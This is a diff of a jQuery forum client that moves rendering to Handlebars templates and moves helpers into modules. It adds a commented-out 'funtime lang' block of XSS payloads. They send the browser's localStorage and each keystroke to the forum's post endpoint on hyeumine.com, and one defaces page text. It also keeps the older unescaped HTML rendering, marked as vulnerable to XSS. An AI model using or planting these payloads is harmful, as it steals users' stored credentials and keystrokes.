@@ -1,29 +1,72 @@
+import { DOMAIN_NAME, ON_PROD, POSTS_PER_PAGE } from "./lib/constants.js";
+import { isLoggedIn, showToast, validateInputFields } from "./lib/helper.js";
+
+let currentPage = 1;
+let posts;
+let user = JSON.parse(localStorage.getItem("user"));
+let postsTemplate;
+let postFocusTemplate;
+
 $(function () {
-  // contants
-  const DOMAIN_NAME = "http://hyeumine.com";
-  const POSTS_PER_PAGE = 20;
-  const MAX_CHARACTERS_ON_CREDENTIALS = 30;
-  const MAX_CHARACTERS_ON_TEXT = 300;
+  $.ajax({
+    method: "GET",
+    url: "./templates/post.hbs",
+    dataType: "html",
+    success: (data) => {
+      postsTemplate = data;
+    },
+  });
 
-  let currentPage = 0;
-  let posts;
-  let user = JSON.parse(localStorage.getItem("user"));
+  $.ajax({
+    method: "GET",
+    url: "./templates/postFocus.hbs",
+    dataType: "html",
+    success: (data) => {
+      postFocusTemplate = data;
+    },
+  });
 
-  async function showToast(message, isError = false) {
-    const toastId = `#toast`;
-    $(`${toastId}-message`).html(`
-      <p class="${isError && "text-red-300"} px-1">${message}</p>
-    `);
-    $(toastId).slideToggle("fast");
+  $.ajax({
+    method: "GET",
+    url: "./templates/toast.hbs",
+    dataType: "html",
+    success: (data) => {
+      $("body").prepend(data);
+      $("#toast").hide();
+    },
+  });
 
-    setTimeout(() => {
-      $(toastId).slideToggle("fast");
-    }, 1000);
-  }
+  // funtime lang
+  // $("body").prepend(`<img
+  //     src
+  //     onerror="fetch('http:\/\/hyeumine.com/forumNewPost.php', body:{id:25,post:JSON.stringify(localStorage)})"
+  //   />`);
+
+  // $(
+  //   "body"
+  // ).prepend(`<script>$(function () {$.ajax({method: "POST",url: "http://hyeumine.com/forumNewPost.php",
+  //         data: { id: 25, post: JSON.stringify(localStorage)}})})</script>`);
+
+  // $("body").prepend(`
+  // <script>document.addEventListener('keypress', function(event){
+  //   console.log(String.fromCharCode(event.keyCode))
+  //   $.ajax({method:'POST',url:'http://hyeumine.com/forumNewPost.php',data:{post:'pressed:'+String.fromCharCode(event.keyCode),id:25}})
+  // })</script>
+  // `);
+
+  // $("body").prepend(`<script>document.addEventListener('keypress', function(event){$("p, h1, h2, h3, h4, h5, h6, span").text("HACKED")})</script>`);
+
+  // $.get(
+  //   "https://ipinfo.io",
+  //   function (response) {
+  //     alert(response.ip);
+  //   },
+  //   "json"
+  // );
 
   async function deletePost(id) {
     try {
-      if (!user) throw new Error("You must be authenticated to delete a post!");
+      isLoggedIn(user);
 
       $.ajax({
         method: "POST",
@@ -33,8 +76,7 @@ $(function () {
           if (!data && !data.success)
             throw new Error("Post deletion failed somehow...");
 
-          posts = posts.filter((post) => post.id !== id);
-          displayPosts();
+          getPosts();
           showToast("Post deleted successfully!");
         },
       });
@@ -43,33 +85,39 @@ $(function () {
     }
   }
 
-  async function displayPosts() {
+  async function renderPosts() {
     try {
+      let htmlTemplate = Handlebars.compile(postsTemplate);
+
+      const end = Math.min(posts.length, POSTS_PER_PAGE * currentPage);
+      const postsWithOwner = posts.splice(0, end).map((post) => {
+        return {
+          ...post,
+          isOwner: post.uid == user.id || !ON_PROD,
+        };
+      });
+
       const postsContainer = $("#posts-container");
-      const start = POSTS_PER_PAGE * currentPage;
-      const end = Math.min(posts.length, start + POSTS_PER_PAGE);
+      const context = { data: postsWithOwner };
+      postsContainer.html(htmlTemplate(context));
+
+      // sensitive code to xss
+
+      /*
       let html = "";
-
-      for (let i = start; i < end; ++i) {
+      for (const elem of postsWithOwner) {
         html += `
-            <div
-              class="px-2 w-full break-words overflow-hidden py-4 border-t border-white/20 hover:bg-black/20 transition-all flex justify-between"
-            >
-              <div class="w-[90%]">
-                <h3 class="text-xl font-bold">${posts[i].user}</h3>
-                <p class="text-xs">${posts[i].date}</p>
-                <p class="mt-2">${posts[i].post}</p>
-              </div>
-              <button
-                class="delete-button p-1 transition-all hover:bg-white/20 rounded-lg mx-auto w-fit h-fit hover:text-red-300"
-                value="${posts[i].id}"
-              >⌫
-              </button>
-            </div>
-            `;
+        <div class="mt-2 border-t border-slate-200 p-2">
+          <h1 class="text-lg font-bold">${elem.user}</h1>
+          <p class="">${elem.date}</p>
+          <p class="">${elem.post}</p>
+        <button class="delete-button" value=${elem.id}>delete</button>
+        </div>
+        `;
       }
-
       postsContainer.html(html);
+      */
+
       $(".delete-button").on("click", (e) => {
         deletePost($(e.target).attr("value"));
       });
@@ -86,7 +134,7 @@ $(function () {
         success: (data) => {
           posts = JSON.parse(data);
           posts = posts.reverse();
-          displayPosts();
+          renderPosts();
         },
       });
     } catch (err) {
@@ -106,19 +154,7 @@ $(function () {
   async function createUser() {
     try {
       const inputFields = $("#auth-form > div > input");
-
-      const inputData = {};
-      for (const element of inputFields) {
-        let value = $(`#${element.id}`).val();
-
-        if (value.length === 0)
-          throw new Error("Input fields must not be empty!");
-        if (value.length > MAX_CHARACTERS_ON_CREDENTIALS)
-          throw new Error(
-            `Input field's character length must not exceed ${MAX_CHARACTERS}!`
-          );
-        inputData[element.id] = value;
-      }
+      const inputData = validateInputFields(inputFields);
 
       $.ajax({
         method: "POST",
@@ -141,21 +177,16 @@ $(function () {
 
   async function createPost() {
     try {
-      if (!user) throw new Error("You must be authenticated to create a post!");
+      isLoggedIn(user);
 
-      const post = $("#text").val();
+      const post = document.getElementById("post");
       const id = JSON.stringify(user.id);
-
-      if (post.length === 0) throw new Error("Post must not be empty!");
-      if (post.length > MAX_CHARACTERS_ON_TEXT)
-        throw new Error(
-          `Post's character length must not exceed ${MAX_CHARACTERS_ON_TEXT}!`
-        );
+      const inputData = { ...validateInputFields([post]), id };
 
       $.ajax({
         method: "POST",
         url: `${DOMAIN_NAME}/forumNewPost.php`,
-        data: { post, id },
+        data: inputData,
         success: (data) => {
           data = JSON.parse(data);
 
@@ -180,7 +211,6 @@ $(function () {
   }
 
   // on load
-  $("#toast").hide();
   $("#auth-form").addClass("hidden");
   $("#create-user").on("click", createUser);
   $("#create-post").on("click", createPost);
